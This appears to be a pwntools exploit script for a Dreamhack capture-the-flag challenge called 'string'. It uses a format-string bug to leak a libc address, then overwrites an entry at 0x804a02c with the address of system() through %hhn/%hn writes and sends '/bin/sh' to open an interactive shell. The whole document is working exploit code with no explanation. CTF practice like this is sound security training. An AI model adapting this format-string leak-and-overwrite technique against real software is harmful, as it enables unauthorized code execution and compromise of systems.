#!/usr/bin/env python3
from pwn import *

PORT = 18272
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./string_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b*0x804881a
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)
def menu(i): sla(b'> ', str(i).encode())


menu(1)

sla(b'Input: ', b'%71$p')
# GDB()
menu(2)
p.recvuntil(b': ')
libc.address = int(p.recvline().strip(), 16) - 0x18637
log.info(f'libc: {hex(libc.address)}')

tg = 0x804a02c
system = libc.sym.system

fmt = f'%{system & 0xff}c%13$hhn'.encode()
fmt += f'%{((system>>8) & 0xffff) - (system & 0xff)}c%14$hn'.encode()
pl = fmt.ljust(0x4*8, b'B') + flat(tg, tg+1)

menu(1)
sla(b'Input: ', pl)

# GDB()
menu(2)

menu(1)
sla(b'Input: ', b'/bin/sh')
menu(2)
p.interactive()